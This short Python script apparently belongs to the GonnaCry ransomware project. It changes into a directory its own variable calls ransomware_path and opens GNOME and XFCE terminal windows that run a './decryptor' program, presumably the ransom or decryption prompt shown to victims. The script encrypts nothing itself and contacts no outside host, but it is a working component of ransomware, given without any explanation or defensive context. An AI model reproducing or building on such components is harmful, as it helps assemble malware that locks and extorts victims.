import os
import base64
import subprocess
import time
ransomware_path = '/home/tarcisio/gonnacry'
os.chdir(ransomware_path)
gnome = 'gnome-terminal --command ./decryptor'
os.system(gnome)
xfce = 'xfce4-terminal --command=./decryptor'
os.system(xfce)